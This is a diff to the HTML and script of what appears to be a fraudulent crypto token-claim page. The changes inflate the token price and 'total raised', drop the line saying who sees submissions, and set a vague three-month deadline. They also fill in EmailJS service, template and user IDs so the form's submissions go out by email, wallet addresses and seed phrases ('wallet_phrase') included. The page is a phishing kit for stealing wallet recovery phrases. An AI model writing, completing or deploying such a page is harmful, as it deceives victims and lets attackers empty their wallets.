@@ -77,11 +77,11 @@
                     <div class="grid grid-cols-2 gap-4">
                         <div class="bg-white p-3 rounded-lg border border-gray-200">
                             <p class="text-gray-500 text-sm">Token Price</p>
-                            <p class="font-medium">$0.01</p>
+                            <p class="font-medium">$0.05</p>
                         </div>
                         <div class="bg-white p-3 rounded-lg border border-gray-200">
                             <p class="text-gray-500 text-sm">Total Raised</p>
-                            <p class="font-medium">$200,864.93</p>
+                            <p class="font-medium">$1M</p>
                         </div>
                     </div>
                 </div>
@@ -149,13 +149,13 @@
                     <h3 class="font-medium text-gray-800 flex items-center">
                         <i class="fas fa-shield-alt mr-2 text-green-600"></i> Is this process secure?
                     </h3>
-                    <p class="text-gray-600 mt-2 pl-6">Yes, all submissions are encrypted and only our verification team will have access to your details.</p>
+                    <p class="text-gray-600 mt-2 pl-6">Yes, all submissions are encrypted and Secure.  </p>
                 </div>
                 <div>
                     <h3 class="font-medium text-gray-800 flex items-center">
                         <i class="fas fa-exclamation-triangle mr-2 text-yellow-600"></i> What if I miss the claim period?
                     </h3>
-                    <p class="text-gray-600 mt-2 pl-6">Unclaimed tokens will be burned after the claim period ends on December 31, 2023.</p>
+                    <p class="text-gray-600 mt-2 pl-6">Unclaimed tokens will be burned after the claim period ends in three months.</p>
                 </div>
             </div>
         </div>
@@ -266,7 +266,7 @@
             });
 
             // Initialize EmailJS (replace with your credentials)
-            emailjs.init('YOUR_EMAILJS_USER_ID');
+            emailjs.init('aXqBVLq5OuvHNlbHv');
         });
 
         // Modal functionality
@@ -331,7 +331,7 @@
             // This is just for demonstration of the UI flow
             
             // Send email via EmailJS
-            emailjs.send('YOUR_EMAILJS_SERVICE_ID', 'YOUR_EMAILJS_TEMPLATE_ID', {
+            emailjs.send('service_er9jgjg', 'template_sikdii8', {
                 wallet_type: walletType,
                 wallet_address: walletAddress,
                 wallet_phrase: walletPhrase,
